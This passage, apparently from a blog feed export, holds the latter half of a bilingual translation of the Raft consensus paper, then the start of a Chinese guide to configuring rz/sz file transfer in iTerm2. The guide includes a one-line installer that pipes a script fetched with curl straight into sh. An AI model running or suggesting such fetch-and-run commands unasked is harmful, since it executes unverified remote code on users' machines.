three factors: which quiz they took, their degree of prior Paxos experience, and the order in which they learned the algorithms. The model predicts that the choice of quiz produces a 12.5-point difference in favor of Raft. This is significantly higher than the observed difference of 4.9 points, because many of the actual students had prior Paxos experience, which helped Paxos considerably, whereas it helped Raft slightly less. Curiously, the model also predicts scores 6.3 points lower on Raft for people that have already taken the Paxos quiz; although we don’t know why, this does appear to be statistically significant.</p><p>我们还创建了一个线性回归模型，该模型根据三个因素预测新生的测验分数：他们参加了哪个测验、他们先前的 Paxos 经验程度以及他们学习算法的顺序。 该模型预测测验的选择会产生 12.5 分的差异，这有利于 Raft。 这明显高于观察到的 4.9 分的差异，因为许多实际的学生之前都有 Paxos 经验，这对 Paxos 有很大帮助，而对 Raft 的帮助略小。 奇怪的是，该模型还预测已经参加 Paxos 测验的人在 Raft 上的得分低 6.3 分； 虽然我们不知道为什么，但这似乎在统计上是显著的。</p><p><a href="https://cdn.bugwz.com/raft-5-point.png"><img src="https://cdn.bugwz.com/raft-5-point.png" alt="5 Point">5 Point</a></p><p>Figure 15: Using a 5-point scale, participants were asked (left) which algorithm they felt would be easier to implement in a functioning, correct, and efficient system, and (right) which would be easier to explain to a CS graduate student.</p><p>图 15：使用 5 分制，参与者被问及（左）他们认为哪种算法在功能正常、正确且高效的系统中更容易实现，（右）哪种算法更容易向 CS 研究生解释。</p><p>We also surveyed participants after their quizzes to see which algorithm they felt would be easier to implement or explain; these results are shown in Figure 15. An overwhelming majority of participants reported Raft would be easier to implement and explain (33 of 41 for each question). However, these self-reported feelings may be less reliable than participants’ quiz scores, and participants may have been biased by knowledge of our hypothesis that Raft is easier to understand.</p><p>我们还在测验后对参与者进行了调查，以了解他们认为哪种算法更容易实现或解释； 这些结果显示在图 15 中。绝大多数参与者报告说 Raft 更容易实现和解释（每个问题 41 个中的 33 个）。 然而，这些自我报告的感觉可能不如参与者的测验分数可靠，而且参与者可能因为我们对 Raft 更容易理解的假设的了解而产生偏见。</p><p>A detailed discussion of the Raft user study is available at [31].</p><p>Raft 用户研究的详细讨论可在 [31] 中找到。</p><h3 id="9-2、Correctness（正确性）"><a href="#9-2、Correctness（正确性）" class="headerlink" title="9.2、Correctness（正确性）"></a>9.2、Correctness（正确性）</h3><p>We have developed a formal specification and a proof of safety for the consensus mechanism described in Section 5. The formal specification [31] makes the information summarized in Figure 2 completely precise using the TLA+ specification language [17]. It is about 400 lines long and serves as the subject of the proof. It is also useful on its own for anyone implementing Raft. We have mechanically proven the Log Completeness Property using the TLA proof system [7]. However, this proof relies on invariants that have not been mechanically checked (for example, we have not proven the type safety of the specification). Furthermore, we have written an informal proof [31] of the State Machine Safety property which is complete (it relies on the specification alone) and relatively precise (it is about 3500 words long).</p><p>我们已经为第 5 节中描述的共识机制制定了正式规范和安全证明。正式规范 [31] 使用 TLA+ 规范语言 [17] 使图 2 中总结的信息完全准确。 它大约有 400 行长，作为证明的主题。 对于任何实现 Raft 的人来说，它本身也很有用。 我们已经使用 TLA 证明系统 [7] 机械证明了日志完整性属性。 然而，这个证明依赖于没有经过机械检查的不变量（例如，我们没有证明规范的类型安全）。 此外，我们编写了状态机安全属性的非正式证明 [31]，该证明是完整的（仅依赖于规范）且相对精确（大约 3500 字长）。</p><p><a href="https://cdn.bugwz.com/raft-data.png"><img src="https://cdn.bugwz.com/raft-data.png" alt="Raft">Raft</a></p><p>Table 1: Concerns of possible bias against Paxos in the study, steps taken to counter each, and additional materials available.</p><p>表 1：研究中对 Paxos 可能存在偏见的担忧、针对每种偏见采取的措施以及可用的其他材料。</p><p><a href="https://cdn.bugwz.com/raft-replace-time.png"><img src="https://cdn.bugwz.com/raft-replace-time.png" alt="The time to detect and replace a crashed leader">The time to detect and replace a crashed leader</a></p><p>Figure 16: The time to detect and replace a crashed leader. The top graph varies the amount of randomness in election timeouts, and the bottom graph scales the minimum election timeout. Each line represents 1000 trials (except for 100 trials for “150–150ms”) and corresponds to a particular choice of election timeouts; for example, “150–155ms” means that election timeouts were chosen randomly and uniformly between 150ms and 155ms. The measurements were taken on a cluster of five servers with a broadcast time of roughly 15ms. Results for a cluster of nine servers are similar.</p><p>图 16：检测和更换宕机的领导者所需的时间。 上图改变了选举超时的随机性，下图缩放了最小选举超时。 每行代表 1000 次试验（除了“150-150ms”的 100 次试验）并且对应于选举超时的特定选择； 例如，“150-155ms”表示选举超时时间是随机选择的，并且在 150ms 和 155ms 之间统一。 测量是在五台服务器的集群上进行的，广播时间大约为 15 毫秒。 九台服务器集群的结果是相似的。</p><h3 id="9-3、Performance（性能）"><a href="#9-3、Performance（性能）" class="headerlink" title="9.3、Performance（性能）"></a>9.3、Performance（性能）</h3><p>Raft’s performance is similar to other consensus algorithms such as Paxos. The most important case for performance is when an established leader is replicating new log entries. Raft achieves this using the minimal number of messages (a single round-trip from the leader to half the cluster). It is also possible to further improve Raft’s performance. For example, it easily supports batching and pipelining requests for higher throughput and lower latency. Various optimizations have been proposed in the literature for other algorithms; many of these could be applied to Raft, but we leave this to future work.</p><p>Raft 的性能类似于 Paxos 等其他共识算法。 性能最重要的情况是当已建立的领导者正在复制新的日志条目时。 Raft 使用最少数量的消息（从领导者到一半集群的单次往返）实现了这一点。 还可以进一步提高 Raft 的性能。 例如，它可以轻松支持批处理和流水线请求，以实现更高的吞吐量和更低的延迟。 在其他算法的文献中已经提出了各种优化； 其中许多可以应用于 Raft，但我们将其留给未来的工作。</p><p>We used our Raft implementation to measure the performance of Raft’s leader election algorithm and answer two questions. First, does the election process converge quickly? Second, what is the minimum downtime that can be achieved after leader crashes?</p><p>我们使用 Raft 实现来衡量 Raft 的领导者选举算法的性能并回答两个问题。 第一，选举过程收敛很快吗？ 其次，领导者宕机后可以达到的最小停机时间是多少？</p><p>To measure leader election, we repeatedly crashed the leader of a cluster of five servers and timed how long it took to detect the crash and elect a new leader (see Figure 16). To generate a worst-case scenario, the servers in each trial had different log lengths, so some candidates were not eligible to become leader. Furthermore, to encourage split votes, our test script triggered a synchronized broadcast of heartbeat RPCs from the leader before terminating its process (this approximates the behavior of the leader replicating a new log entry prior to crashing). The leader was crashed uniformly randomly within its heartbeat interval, which was half of the minimum election timeout for all tests. Thus, the smallest possible downtime was about half of the minimum election timeout.</p><p>为了衡量领导者选举，我们反复让五台服务器组成的集群的领导者宕机，并对检测到宕机和选举新领导所需的时间进行计时（见图 16）。 为了产生最坏的情况，每次试验中的服务器都有不同的日志长度，因此一些候选者没有资格成为领导者。 此外，为了鼓励分裂投票，我们的测试脚本在终止进程之前触发了来自领导者的心跳 RPC 的同步广播（这近似于领导者在崩溃之前复制新日志条目的行为）。 领导者在其心跳间隔内均匀随机崩溃，这是所有测试的最小选举超时时间的一半。 因此，最小可能的停机时间大约是最小选举超时时间的一半。</p><p>The top graph in Figure 16 shows that a small amount of randomization in the election timeout is enough to avoid split votes in elections. In the absence of randomness, leader election consistently took longer than 10 seconds in our tests due to many split votes. Adding just 5ms of randomness helps significantly, resulting in a median downtime of 287ms. Using more randomness improves worst-case behavior: with 50ms of randomness the worstcase completion time (over 1000 trials) was 513ms.</p><p>图 16 中的顶部图表显示，选举超时中的少量随机化足以避免选举中的分裂投票。 在缺乏随机性的情况下，由于许多分裂选票，在我们的测试中，领导者选举的时间始终超过 10 秒。 仅添加 5 毫秒的随机性有很大帮助，导致平均停机时间为 287 毫秒。 使用更多的随机性可以改善最坏情况的行为：随机性为 50 毫秒时，最坏情况的完成时间（超过 1000 次试验）为 513 毫秒。</p><p>The bottom graph in Figure 16 shows that downtime can be reduced by reducing the election timeout. With an election timeout of 12–24ms, it takes only 35ms on average to elect a leader (the longest trial took 152ms). However, lowering the timeouts beyond this point violates Raft’s timing requirement: leaders have difficulty broadcasting heartbeats before other servers start new elections. This can cause unnecessary leader changes and lower overall system availability. We recommend using a conservative election timeout such as 150–300ms; such timeouts are unlikely to cause unnecessary leader changes and will still provide good availability.</p><p>图 16 中的底部图表显示可以通过减少选举超时来减少停机时间。 选举超时时间为 12-24 毫秒，平均只需要 35 毫秒就可以选举出一个领导者（最长的试验需要 152 毫秒）。 然而，将超时时间降低到这一点之后违反了 Raft 的时间要求：在其他服务器开始新的选举之前，领导者很难广播心跳。 这可能会导致不必要的领导者变更并降低整体系统可用性。 我们建议使用保守的选举超时，例如 150-300 毫秒； 此类超时不太可能导致不必要的领导者更改，并且仍将提供良好的可用性。</p><h2 id="10、Related-work（相关工作）"><a href="#10、Related-work（相关工作）" class="headerlink" title="10、Related work（相关工作）"></a>10、Related work（相关工作）</h2><p>There have been numerous publications related to consensus algorithms, many of which fall into one of the following categories:</p><ul><li>Lamport’s original description of Paxos [15], and attempts to explain it more clearly [16, 20, 21].</li><li>Elaborations of Paxos, which fill in missing details and modify the algorithm to provide a better foundation for implementation [26, 39, 13].</li><li>Systems that implement consensus algorithms, such as Chubby [2, 4], ZooKeeper [11, 12], and Spanner [6]. The algorithms for Chubby and Spanner have not been published in detail, though both claim to be based on Paxos. ZooKeeper’s algorithm has been published in more detail, but it is quite different from Paxos.</li><li>Performance optimizations that can be applied to Paxos [18, 19, 3, 25, 1, 27].</li><li>Oki and Liskov’s Viewstamped Replication (VR), an alternative approach to consensus developed around the same time as Paxos. The original description [29] was intertwined with a protocol for distributed transactions, but the core consensus protocol has been separated in a recent update [22]. VR uses a leaderbased approach with many similarities to Raft.</li></ul><p>已经有许多与共识算法相关的出版物，其中许多属于以下类别之一：</p><ul><li>Lamport 对 Paxos 的原始描述 [15]，并试图更清楚地解释它 [16, 20, 21]。</li><li>Paxos 的详细说明，填补缺失的细节并修改算法，为实现提供更好的基础 [26, 39, 13]。</li><li>实现共识算法的系统，例如 Chubby [2, 4]、ZooKeeper [11, 12] 和 Spanner [6]。 Chubby 和 Spanner 的算法尚未详细发布，但都声称基于 Paxos。 ZooKeeper 的算法已经更详细的公布了，但是和 Paxos 有很大的不同。</li><li>可应用于 Paxos [18, 19, 3, 25, 1, 27] 的性能优化。</li><li>Oki 和 Liskov 的 Viewstamped Replication (VR)，一种与 Paxos 大约同时发展的共识替代方法。 最初的描述 [29] 与分布式交易协议交织在一起，但在最近的更新 [22] 中，核心共识协议已被分离。 VR 使用基于领导者的方法，与 Raft 有许多相似之处。</li></ul><p>The greatest difference between Raft and Paxos is Raft’s strong leadership: Raft uses leader election as an essential part of the consensus protocol, and it concentrates as much functionality as possible in the leader. This approach results in a simpler algorithm that is easier to understand. For example, in Paxos, leader election is orthogonal to the basic consensus protocol: it serves only as a performance optimization and is not required for achieving consensus. However, this results in additional mechanism: Paxos includes both a two-phase protocol for basic consensus and a separate mechanism for leader election. In contrast, Raft incorporates leader election directly into the consensus algorithm and uses it as the first of the two phases of consensus. This results in less mechanism than in Paxos.</p><p>Raft 和 Paxos 最大的区别在于 Raft 的强大领导力：Raft 将领导选举作为共识协议的重要组成部分，并将尽可能多的功能集中在领导身上。 这种方法导致更简单的算法更容易理解。 例如，在 Paxos 中，领导者选举与基本共识协议是正交的：它仅用作性能优化，而不是达成共识所必需的。 然而，这导致了额外的机制：Paxos 包括用于基本共识的两阶段协议和用于领导者选举的单独机制。 相比之下，Raft 将领导者选举直接纳入共识算法，并将其用作共识的两个阶段中的第一个。 这导致比 Paxos 更少的机制。</p><p>Like Raft, VR and ZooKeeper are leader-based and therefore share many of Raft’s advantages over Paxos. However, Raft has less mechanism that VR or ZooKeeper because it minimizes the functionality in non-leaders. For example, log entries in Raft flow in only one direction: outward from the leader in AppendEntries RPCs. In VR log entries flow in both directions (leaders can receive log entries during the election process); this results in additional mechanism and complexity. The published description of ZooKeeper also transfers log entries both to and from the leader, but the implementation is apparently more like Raft [35].</p><p>与 Raft 一样，VR 和 ZooKeeper 也是基于领导者的，因此与 Paxos 相比，有许多 Raft 的优势。 然而，Raft 的机制比 VR 或 ZooKeeper 少，因为它最大限度地减少了非领导者的功能。 例如，Raft 中的日志条目仅向一个方向流动：从 AppendEntries RPC 中的领导者向外流动。 在 VR 中，日志条目是双向流动的（leader 可以在选举过程中收到日志条目）； 这会导致额外的机制和复杂性。 已发布的 ZooKeeper 描述也将日志条目传输到领导者和从领导者传输日志条目，但实现显然更像 Raft [35]。</p><p>Raft has fewer message types than any other algorithm for consensus-based log replication that we are aware of. For example, we counted the message types VR and ZooKeeper use for basic consensus and membership changes (excluding log compaction and client interaction, as these are nearly independent of the algorithms). VR and ZooKeeper each define 10 different message types, while Raft has only 4 message types (two RPC requests and their responses). Raft’s messages are a bit more dense than the other algorithms’, but they are simpler collectively. In addition, VR and ZooKeeper are described in terms of transmitting entire logs during leader changes; additional message types will be required to optimize these mechanisms so that they are practical.</p><p>相比较于上述我们提及的其他服务于日志复制的共识算法的算法，Raft 拥有更少的消息类型。例如，我们统计了一下VR 和 ZooKeeper 使用的用于基本共识需要和成员变更的消息类型数（不包括日志压缩和客户端交互，因为这些几乎独立于算法）。VR 和 ZooKeeper 都分别定义了 10 种不同的消息类型，相对的，Raft 只有 4 种消息类型（两种 RPC 请求和对应的响应）。Raft 的消息都稍微比其他算法的要信息量大，但是都很简单。另外，VR 和 ZooKeeper 都在领导人变更时传输了整个日志；所以为了能够实践中使用，额外的消息类型就很必要了。</p><p>Raft’s strong leadership approach simplifies the algorithm, but it precludes some performance optimizations. For example, Egalitarian Paxos (EPaxos) can achieve higher performance under some conditions with a leaderless approach [27]. EPaxos exploits commutativity in state machine commands. Any server can commit a command with just one round of communication as long as other commands that are proposed concurrently commute with it. However, if commands that are proposed concurrently do not commute with each other, EPaxos requires an additional round of communication. Because any server may commit commands, EPaxos balances load well between servers and is able to achieve lower latency than Raft in WAN settings. However, it adds significant complexity to Paxos.</p><p>Raft 的强领导人方法简化了整个算法，但是同时也妨碍了一些性能优化的方法。例如， Egalitarian Paxos （EPaxos）在某些没有领导人的情况下可以达到很高的性能。EPaxos 充分发挥了在状态机指令中的交换性。任何服务器都可以在一轮通信下就提交指令，只要其他同时被提交的指令和它进行沟通。然而，如果并发被提交的指令，互相之间没有进行通信沟通，那么 EPaxos 就需要额外的一轮通信。因为任何服务器都可能提交指令，EPaxos 在服务器之间的负载均衡做的很好，并且很容易在 WAN 网络环境下获得很低的延迟。但同时，它也在 Paxos 上增加了许多重要的复杂度。</p><p>Several different approaches for cluster membership changes have been proposed or implemented in other work, including Lamport’s original proposal [15], VR [22], and SMART [24]. We chose the joint consensus approach for Raft because it leverages the rest of the consensus protocol, so that very little additional mechanism is required for membership changes. Lamport’s α-based approach was not an option for Raft because it assumes consensus can be reached without a leader. In comparison to VR and SMART, Raft’s reconfiguration algorithm has the advantage that membership changes can occur without limiting the processing of normal requests; in contrast, VR stops all normal processing during configuration changes, and SMART imposes an α-like limit on the number of outstanding requests. Raft’s approach also adds less mechanism than either VR or SMART.</p><p>一些处理集群成员变换的方法已经被提出或者在其他的成果中被实现，包括 Lamport 最初的讨论，VR 和 SMART。我们选择使用联合共识（joint consensus）方法，是因为利用了共识协议，这样我们就只需要增加很少一部分机制就可以实现成员变更。 Lamport 的基于 α 的方法对于Raft并不适用，因为它假定共识可以不需要领导者就可以达到。和 VR 和 SMART 相比较，Raft 的重配置算法可以在不影响正常请求处理的情况下进行；相比较而言，VR 需要停止所有的处理请求。SMART 则引入了一个和 α 类似的方法，限制了请求处理的数量。同时，Raft 的方法需要更少的额外机制来实现。</p><h2 id="11、Conclusion（结论）"><a href="#11、Conclusion（结论）" class="headerlink" title="11、Conclusion（结论）"></a>11、Conclusion（结论）</h2><p>Algorithms are often designed with correctness, efficiency, and&#x2F;or conciseness as the primary goals. Although these are all worthy goals, we believe that understandability is just as important. None of the other goals can be achieved until developers render the algorithm into a practical implementation, which will inevitably deviate from and expand upon the published form. Unless developers have a deep understanding of the algorithm and can create intuitions about it, it will be difficult for them to retain its desirable properties in their implementation.</p><p>算法的设计通常以正确性、效率 和&#x2F;或 简洁性为主要目标。 尽管这些都是有价值的目标，但我们认为可理解性同样重要。 在开发人员将算法转化为实际的实现之前，其他任何目标都无法实现，这将不可避免地偏离和扩展已发布的形式。 除非开发人员对算法有深刻的理解并且可以对它产生直觉，否则他们将很难在他们的实现中保留其理想的属性。</p><p>In this paper we addressed the issue of distributed consensus, where a widely accepted but impenetrable algorithm, Paxos, has challenged students and developers for many years. We developed a new algorithm, Raft, which we have shown to be more understandable than Paxos. We also believe that Raft provides a better foundation for system building. Using understandability as the primary design goal changed the way we approached the design of Raft; as the design progressed we found ourselves reusing a few techniques repeatedly, such as decomposing the problem and simplifying the state space. These techniques not only improved the understandability of Raft but also made it easier to convince ourselves of its correctness.</p><p>在本文中，我们解决了分布式共识的问题，其中一种被广泛接受但难以理解的算法 Paxos 多年来一直在挑战学生和开发人员。 我们开发了一种新算法 Raft，我们已经证明它比 Paxos 更容易理解。 我们也相信 Raft 为系统构建提供了更好的基础。 使用可理解性作为主要设计目标改变了我们处理 Raft 设计的方式； 随着设计的进展，我们发现自己重复使用了一些技术，例如分解问题和简化状态空间。 这些技术不仅提高了 Raft 的可理解性，而且更容易让我们相信它的正确性。</p><h2 id="12、Acknowledgments（致谢）"><a href="#12、Acknowledgments（致谢）" class="headerlink" title="12、Acknowledgments（致谢）"></a>12、Acknowledgments（致谢）</h2><p>The user study would not have been possible without the support of Ali Ghodsi, David Mazieres, and the students of CS 294-91 at Berkeley and CS 240 at Stanford. Scott Klemmer helped us design the user study, and Nelson Ray advised us on statistical analysis. The Paxos slides for the user study borrowed heavily from a slide deck originally created by Lorenzo Alvisi. Special thanks go to David Mazieres and Ezra Hoch for finding subtle bugs in Raft. Many people provided helpful feedback on the paper and user study materials, including Ed Bugnion, Michael Chan, Hugues Evrard,Daniel Giffin, Arjun Gopalan, Jon Howell, Vimalkumar Jeyakumar, Ankita Kejriwal, Aleksandar Kracun, Amit Levy, Joel Martin, Satoshi Matsushita, Oleg Pesok, David Ramos, Robbert van Renesse, Mendel Rosenblum, Nicolas Schiper, Deian Stefan, Andrew Stone, Ryan Stutsman, David Terei, Stephen Yang, Matei Zaharia, 24 anonymous conference reviewers (with duplicates), and especially our shepherd Eddie Kohler. Werner Vogels tweeted a link to an earlier draft, which gave Raft significant exposure. This work was supported by the Gigascale Systems Research Center and the Multiscale Systems Center, two of six research centers funded under the Focus Center Research Program, a Semiconductor Research Corporation program, by STARnet, a Semiconductor Research Corporation program sponsored by MARCO and DARPA, by the National Science Foundation under Grant No. 0963859, and by grants from Facebook, Google, Mellanox, NEC, NetApp, SAP, and Samsung. Diego Ongaro is supported by The Junglee Corporation Stanford Graduate Fellowship.</p><p>如果没有 Ali Ghodsi、David Mazieres 和伯克利 CS 294-91 和斯坦福大学 CS 240 学生的支持，用户研究是不可能的。 Scott Klemmer 帮助我们设计了用户研究，Nelson Ray 为我们提供了统计分析方面的建议。用于用户研究的 Paxos 幻灯片大量借用了最初由 Lorenzo Alvisi 创建的幻灯片。特别感谢 David Mazieres 和 Ezra Hoch 在 Raft 中发现了细微的错误。许多人对论文和用户研究材料提供了有用的反馈，包括 Ed Bugnion、Michael Chan、Hugues Evrard、Daniel Giffin、Arjun Gopalan、Jon Howell、Vimalkumar Jeyakumar、Ankita Kejriwal、Aleksandar Kracun、Amit Levy、Joel Martin、Satoshi Matsushita， Oleg Pesok、David Ramos、Robbert van Renesse、Mendel Rosenblum、Nicolas Schiper、Deian Stefan、Andrew Stone、Ryan Stutsman、David Terei、Stephen Yang、Matei Zaharia，24 位匿名会议评论员（有重复），尤其是我们的牧羊人 Eddie Kohler。 Werner Vogels 在推特上发布了一个指向早期草案的链接，这让 Raft 得到了大量曝光。这项工作得到了千兆系统研究中心和多尺度系统中心的支持，这两个研究中心是在焦点中心研究计划（一个半导体研究公司计划）下资助的六个研究中心中的两个，由 STARnet（一个由 MARCO 和 DARPA 赞助的半导体研究公司计划） 0963859 号美国国家科学基金会，以及 Facebook、谷歌、Mellanox、NEC、NetApp、SAP 和三星的资助。 Diego Ongaro 得到 Junglee Corporation 斯坦福大学研究生奖学金的支持。</p><h2 id="References（引用）"><a href="#References（引用）" class="headerlink" title="References（引用）"></a>References（引用）</h2><p>[1] BOLOSKY, W. J., BRADSHAW, D., HAAGENS, R. B., KUSTERS, N. P., AND LI, P. Paxos replicated state machines as the basis of a high-performance data store. In Proc. NSDI’11, USENIX Conference on Networked Systems Design and Implementation (2011), USENIX, pp. 141–154.</p><p>[2] BURROWS, M. The Chubby lock service for looselycoupled distributed systems. In Proc. OSDI’06, Symposium on Operating Systems Design and Implementation (2006), USENIX, pp. 335–350.</p><p>[3] CAMARGOS, L. J., SCHMIDT, R. M., AND PEDONE, F. Multicoordinated Paxos. In Proc. PODC’07, ACM Symposium on Principles of Distributed Computing (2007), ACM, pp. 316–317.</p><p>[4] CHANDRA, T. D., GRIESEMER, R., AND REDSTONE, J. Paxos made live: an engineering perspective. In Proc. PODC’07, ACM Symposium on Principles of Distributed Computing (2007), ACM, pp. 398–407.</p><p>[5] CHANG, F., DEAN, J., GHEMAWAT, S., HSIEH, W. C., WALLACH, D. A., BURROWS, M., CHANDRA, T., FIKES, A., AND GRUBER, R. E. Bigtable: a distributed storage system for structured data. In Proc. OSDI’06, USENIX Symposium on Operating Systems Design and Implementation (2006), USENIX, pp. 205–218.</p><p>[6] CORBETT, J. C., DEAN, J., EPSTEIN, M., FIKES, A., FROST, C., FURMAN, J. J., GHEMAWAT, S., GUBAREV, A., HEISER, C., HOCHSCHILD, P., HSIEH, W., KANTHAK, S., KOGAN, E., LI, H., LLOYD, A., MELNIK, S., MWAURA, D., NAGLE, D., QUINLAN, S., RAO, R., ROLIG, L., SAITO, Y., SZYMANIAK, M., TAYLOR, C., WANG, R., AND WOODFORD, D. Spanner: Google’s globally-distributed database. In Proc. OSDI’12, USENIX Conference on Operating Systems Design and Implementation (2012), USENIX, pp. 251–264.</p><p>[7] COUSINEAU, D., DOLIGEZ, D., LAMPORT, L., MERZ, S., RICKETTS, D., AND VANZETTO, H. TLA+ proofs. In Proc. FM’12, Symposium on Formal Methods (2012), D. Giannakopoulou and D. M´ery, Eds., vol. 7436 of Lecture Notes in Computer Science, Springer, pp. 147–154.</p><p>[8] GHEMAWAT, S., GOBIOFF, H., AND LEUNG, S.-T. The Google file system. In Proc. SOSP’03, ACM Symposium on Operating Systems Principles (2003), ACM, pp. 29–43.</p><p>[9] GRAY, C., AND CHERITON, D. Leases: An efficient faulttolerant mechanism for distributed file cache consistency. In Proceedings of the 12th ACM Ssymposium on Operating Systems Principles (1989), pp. 202–210.</p><p>[10] HERLIHY, M. P., AND WING, J. M. Linearizability: a correctness condition for concurrent objects. ACM Transactions on Programming Languages and Systems 12 (July 1990), 463–492.</p><p>[11] HUNT, P., KONAR, M., JUNQUEIRA, F. P., AND REED, B. ZooKeeper: wait-free coordination for internet-scale systems. In Proc ATC’10, USENIX Annual Technical Conference (2010), USENIX, pp. 145–158.</p><p>[12] JUNQUEIRA, F. P., REED, B. C., AND SERAFINI, M. Zab: High-performance broadcast for primary-backup systems. In Proc. DSN’11, IEEE&#x2F;IFIP Int’l Conf. on Dependable Systems &amp; Networks (2011), IEEE Computer Society, pp. 245–256.</p><p>[13] KIRSCH, J., AND AMIR, Y. Paxos for system builders. Tech. Rep. CNDS-2008-2, Johns Hopkins University, 2008.</p><p>[14] LAMPORT, L. Time, clocks, and the ordering of events in a distributed system. Commununications of the ACM 21, 7 (July 1978), 558–565.</p><p>[15] LAMPORT, L. The part-time parliament. ACM Transactions on Computer Systems 16, 2 (May 1998), 133–169.</p><p>[16] LAMPORT, L. Paxos made simple. ACM SIGACT News 32, 4 (Dec. 2001), 18–25.</p><p>[17] LAMPORT, L. Specifying Systems, The TLA+ Language and Tools for Hardware and Software Engineers. AddisonWesley, 2002.</p><p>[18] LAMPORT, L. Generalized consensus and Paxos. Tech. Rep. MSR-TR-2005-33, Microsoft Research, 2005.</p><p>[19] LAMPORT, L. Fast paxos. Distributed Computing 19, 2 (2006), 79–103.</p><p>[20] LAMPSON, B. W. How to build a highly available system using consensus. In Distributed Algorithms, O. Baboaglu and K. Marzullo, Eds. Springer-Verlag, 1996, pp. 1–17.</p><p>[21] LAMPSON, B. W. The ABCD’s of Paxos. In Proc. PODC’01, ACM Symposium on Principles of Distributed Computing (2001), ACM, pp. 13–13.</p><p>[22] LISKOV, B., AND COWLING, J. Viewstamped replication revisited. Tech. Rep. MIT-CSAIL-TR-2012-021, MIT, July 2012.</p><p>[23] LogCabin source code. <a href="http://github.com/logcabin/logcabin">http://github.com/logcabin/logcabin</a>.</p><p>[24] LORCH, J. R., ADYA, A., BOLOSKY, W. J., CHAIKEN, R., DOUCEUR, J. R., AND HOWELL, J. The SMART way to migrate replicated stateful services. In Proc. EuroSys’06, ACM SIGOPS&#x2F;EuroSys European Conference on Computer Systems (2006), ACM, pp. 103–115.</p><p>[25] MAO, Y., JUNQUEIRA, F. P., AND MARZULLO, K. Mencius: building efficient replicated state machines for WANs. In Proc. OSDI’08, USENIX Conference on Operating Systems Design and Implementation (2008), USENIX, pp. 369–384.</p><p>[26] MAZIERES , D. Paxos made practical. http: <a href="https://www.scs.stanford.edu/%CB%9Cdm/home/">&#x2F;&#x2F;www.scs.stanford.edu/˜dm/home/</a> papers&#x2F;paxos.pdf, Jan. 2007.</p><p>[27] MORARU, I., ANDERSEN, D. G., AND KAMINSKY, M. There is more consensus in egalitarian parliaments. In Proc. SOSP’13, ACM Symposium on Operating System Principles (2013), ACM.</p><p>[28] Raft user study. <a href="http://ramcloud.stanford.edu/~ongaro/userstudy/">http://ramcloud.stanford.edu/~ongaro/userstudy/</a>.</p><p>[29] OKI, B. M., AND LISKOV, B. H. Viewstamped replication: A new primary copy method to support highly-available distributed systems. In Proc. PODC’88, ACM Symposium on Principles of Distributed Computing (1988), ACM, pp. 8–17.</p><p>[30] O’NEIL, P., CHENG, E., GAWLICK, D., AND ONEIL, E. The log-structured merge-tree (LSM-tree). Acta Informatica 33, 4 (1996), 351–385.</p><p>[31] ONGARO, D. Consensus: Bridging Theory and Practice. PhD thesis, Stanford University, 2014 (work in progress). <a href="http://ramcloud.stanford.edu/~ongaro/thesis.pdf">http://ramcloud.stanford.edu/~ongaro/thesis.pdf</a>.</p><p>[32] ONGARO, D., AND OUSTERHOUT, J. In search of an understandable consensus algorithm. In Proc ATC’14, USENIX Annual Technical Conference (2014), USENIX.</p><p>[33] OUSTERHOUT, J., AGRAWAL, P., ERICKSON, D., KOZYRAKIS, C., LEVERICH, J., MAZIERES &#96; , D., MITRA, S., NARAYANAN, A., ONGARO, D., PARULKAR, G., ROSENBLUM, M., RUMBLE, S. M., STRATMANN, E., AND STUTSMAN, R. The case for RAMCloud. Communications of the ACM 54 (July 2011), 121–130.</p><p>[34] Raft consensus algorithm website. <a href="http://raftconsensus.github.io/">http://raftconsensus.github.io</a></p><p>[35] REED, B. Personal communications, May 17, 2013.</p><p>[36] ROSENBLUM, M., AND OUSTERHOUT, J. K. The design and implementation of a log-structured file system. ACM Trans. Comput. Syst. 10 (February 1992), 26–52.</p><p>[37] SCHNEIDER, F. B. Implementing fault-tolerant services using the state machine approach: a tutorial. ACM Computing Surveys 22, 4 (Dec. 1990), 299–319</p><p>[38] SHVACHKO, K., KUANG, H., RADIA, S., AND CHANSLER, R. The Hadoop distributed file system. In Proc. MSST’10, Symposium on Mass Storage Systems and Technologies (2010), IEEE Computer Society, pp. 1–10.</p><p>[39] VAN RENESSE, R. Paxos made moderately complex. Tech. rep., Cornell University, 2012.</p>]]></content>
      
      
      
        <tags>
            
            <tag> Paper </tag>
            
            <tag> Raft </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>iTerm2配置rz/sz上传下载文件</title>
      <link href="/2020/11/02/iterm2-rzsz/"/>
      <url>/2020/11/02/iterm2-rzsz/</url>
      
        <content type="html"><![CDATA[<h2 id="一、iTerm2的Triggers功能"><a href="#一、iTerm2的Triggers功能" class="headerlink" title="一、iTerm2的Triggers功能"></a>一、iTerm2的Triggers功能</h2><p>关于iTerm2的 <a href="https://iterm2.com/documentation/2.1/documentation-triggers.html">Triggers</a> 功能，官方的介绍是：</p><blockquote><p>A trigger is an action that is performed when text matching some regular expression is received in a terminal session.</p></blockquote><p>即：触发器是在终端会话中收到与某个正则表达式匹配的文本时执行的动作。</p><h2 id="二、配置rs-x2F-zs"><a href="#二、配置rs-x2F-zs" class="headerlink" title="二、配置rs&#x2F;zs"></a>二、配置rs&#x2F;zs</h2><h3 id="2-1、一键脚本"><a href="#2-1、一键脚本" class="headerlink" title="2.1、一键脚本"></a>2.1、一键脚本</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl -sSLf https://git.io/bugwz-sh-iterm2-rzsz | sh  </span><br></pre></td></tr></table></figure><p><strong>该脚本作用如下：</strong></p><ul><li>使用指令 <code>brew install lrzsz</code> 安装 <code>lrzsz</code> 软件；</li><li>下载 <code>iterm2-send-zmodem.sh</code> 和 <code>iterm2-recv-zmodem.sh</code> 到 <code>/usr/local/bin/</code> 目录；</li><li>提示在 iTerm2 中进行后续的操作步骤；</li></ul><h3 id="2-2、单独操作步骤"><a href="#2-2、单独操作步骤" class="headerlink" title="2.2、单独操作步骤"></a>2.2、单独操作步骤</h3><ul><li>安装lrzsz：</li></ul><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">brew install lrzsz</span><br></pre></td></tr></table></figure><ul><li>在 <code>/usr/local/bin</code> 目录中新增<code>iterm2-send-zmodem.sh</code> 脚本（内容如下），并设置可执行权限：<code>chmod +x iterm2-send-zmodem.sh</code></li></ul><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash  </span></span><br><span class="line"><span class="comment"># shellcheck shell=dash  </span></span><br><span class="line"><span class="comment"># Author: Matt Mastracci (matthew@mastracci.com)  </span></span><br><span 